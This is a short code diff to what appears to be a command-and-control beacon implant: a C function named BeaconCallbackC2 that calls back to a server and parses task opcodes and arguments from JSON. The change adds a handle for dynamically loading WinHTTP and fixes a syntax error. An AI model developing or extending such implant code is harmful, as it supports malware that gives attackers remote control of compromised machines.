@@ -360,6 +360,7 @@ LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserA
     HINTERNET           hSession = NULL, hConnect = NULL, hRequest = NULL;
     LPCSTR*             UriBuffer;
     DWORD               flags;
+    HMODULE             hWinHTTPdll;
     char*               tmp_decrypted_str;
 
     struct json_object *parsed_json;
@@ -553,7 +554,7 @@ LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserA
     *OpCode     = json_object_get_int(parsed_json_task);
 
     parsed_json_args = json_object_object_get(parsed_json, "args");
-    LPCSTR *argsBuffer = NULL
+    LPCSTR *argsBuffer = NULL;
     if (parsed_json != NULL)
     {
         // Copy args json string into return buffer
